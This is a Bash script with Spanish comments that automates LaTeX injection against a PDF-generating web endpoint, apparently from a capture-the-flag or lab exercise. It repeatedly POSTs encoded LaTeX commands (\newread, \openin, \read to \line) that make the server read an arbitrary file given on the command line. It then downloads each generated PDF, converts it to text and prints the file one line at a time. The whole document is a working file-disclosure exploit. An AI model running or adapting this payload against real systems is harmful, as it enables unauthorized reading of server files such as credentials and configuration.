#!/bin/bash

# Dependencias requeridas
required_cmds="pdftotext curl wget"
for cmd in $required_cmds; do
    if ! command -v "$cmd" &>/dev/null; then
        echo "[!] Error: El binario '$cmd' no está instalado."
        echo "[+] Para instalarlo, ejecute: sudo apt install $cmd (o use el gestor de paquetes adecuado para su distribución)"
        exit 1
    fi
done

declare -r main_url="http://localhost/ajax.php"
filename=$1

# Validación básica de la entrada
if [ -z "$filename" ]; then
    echo -e "[!] Uso: \n$0 /path/to/file"
    exit 1
fi

readfile_line="%0A%5Cread%5Cfile%20to%5Cline"
for i in $(seq 1 100); do
    echo -e "\n[+] Generando inyección..."
    sleep 2

    # Aquí deberías asegurarte de que la construcción de la carga útil sea correcta según tus necesidades
    payload="content=%5Cnewread%5Cfile%0A%5Copenin%5Cfile=$filename$readfile_line%0A%5Ctext%7B%5Cline%7D%0A%5Cclosein%5Cfile&template=blank"
    file_injected=$(curl -s -X POST "$main_url" -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" -d "$payload" | grep -i download | awk 'NF{print $NF}')

    if [ "$file_injected" ]; then
        wget "$file_injected" &>/dev/null
        file=$(basename "$file_injected")
        pdftotext "$file"
        catfile="${file%.pdf}.txt"
        rm "$file"
        head -n 1 "$catfile"
        rm "$catfile"
        readfile_line+="%0A%5Cread%5Cfile%20to%5Cline"
    else
        readfile_line+="%0A%5Cread%5Cfile%20to%5Cline"
    fi
done
